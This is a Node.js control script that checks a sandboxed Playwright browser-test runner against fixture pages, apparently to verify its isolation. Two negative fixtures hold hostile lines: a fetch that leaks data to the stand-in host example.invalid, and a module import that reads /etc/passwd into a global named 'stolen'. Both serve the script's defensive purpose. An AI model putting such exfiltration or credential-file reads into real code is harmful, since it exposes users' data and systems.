// Actual renderer controls for Zed's already installed/admitted Playwright image.
// DO NOT run on the laptop. Fixture JS is served to Chromium, never imported.
import assert from 'node:assert/strict';
import {mkdir, readFile, writeFile} from 'node:fs/promises';
import path from 'node:path';
import {chromium} from '/opt/checker/node_modules/playwright/index.mjs';
import {runBrowser} from './browser-driver.mjs';
import {canonical, sha} from './suite-contract.mjs';

const root=process.argv[2];
assert.equal(process.getuid(),1000,'qualify actual generic-runner UID1000');
assert.equal(process.getgid(),1000,'qualify actual generic-runner GID1000');
if(!root || !path.isAbsolute(root))throw new Error('provide a fresh absolute evidence output root');
await mkdir(root,{recursive:false});
const steps=[{op:'navigate',path:'/apps/board/'},
  {op:'assert_count',selector:'[data-testid="search"]',value:1},
  {op:'fill',selector:'[data-testid="search"]',value:'AlPhA'},
  {op:'assert_text',selector:'[data-testid="result"]',value:'alpha'}];
const suiteBytes=Buffer.from(canonical({schema:'dsmack-bounty-browser-suite/1',tests:[
  {id:'a-search',steps},{id:'z-search-again',steps}]}));
const cases=[
  {name:'candidate',html:'<input data-testid="search"><p data-testid="result"></p><script src="/apps/board/ui.js"></script>',
    js:'document.querySelector("input").addEventListener("input", e => document.querySelector("p").textContent=e.target.value.toLowerCase());',expected:'completed'},
  {name:'base',html:'<p>Feature absent</p>',js:'',expected:'assertion_failed'},
  {name:'script-error',html:'<script src="/apps/board/ui.js"></script>',js:'throw new Error("negative fixture");',expected:'infrastructure_failed'},
  {name:'syntax-error',html:'<script src="/apps/board/ui.js"></script>',js:'function { broken',expected:'infrastructure_failed'},
  {name:'blocked-remote',html:'<input data-testid="search"><p data-testid="result">alpha</p><script src="/apps/board/ui.js"></script>',
    js:'fetch("https://example.invalid/leak").then(()=>document.querySelector("p").textContent="leaked").catch(()=>{});',expected:'completed'},
  {name:'blocked-host-import',html:'<script type="module" src="/apps/board/ui.js"></script>',
    js:'import fs from "node:fs"; globalThis.stolen=fs.readFileSync("/etc/passwd");',expected:'infrastructure_failed'},
];
const results=[];
for(const fixture of cases) {
  const output=path.join(root,fixture.name);
  const assets=new Map([['/apps/board/',{type:'text/html',bytes:Buffer.from(fixture.html)}],
    ['/apps/board/ui.js',{type:'text/javascript',bytes:Buffer.from(fixture.js)}]]);
  const {checks,details}=await runBrowser({suiteBytes,assets,output,chromium});
  results.push({name:fixture.name,status:details.status,expected:fixture.expected,suite_sha256:checks.suite_sha256});
  // Preserve results BEFORE asserting so a real discrepancy remains inspectable.
  await writeFile(path.join(root,'controls.json'),canonical({schema:'dsmack-bounty-browser-controls/1',results}));
  assert.equal(details.status,fixture.expected,JSON.stringify(details));
  assert.equal(checks.suite_sha256,sha(suiteBytes));
  if(fixture.expected!=='infrastructure_failed') {
    assert.equal(checks.completed,true);assert.equal(checks.infrastructure_failed,false);
    assert.deepEqual(checks.tests.map(t=>t.id),['a-search','z-search-again']);
    for(const row of JSON.parse(await readFile(path.join(output,'output-manifest.json'))).files)
      assert.equal(sha(await readFile(path.join(output,row.name))),row.sha256);
  } else {assert.equal(checks.completed,false);assert.equal(checks.infrastructure_failed,true);}
  if(fixture.name==='blocked-remote')assert.ok(details.blocked_requests.some(url=>url.startsWith('https://example.invalid/')));
}
console.log(canonical({controls_passed:true,real_model_qualified:false,attested_execution_qualified:false}).toString());
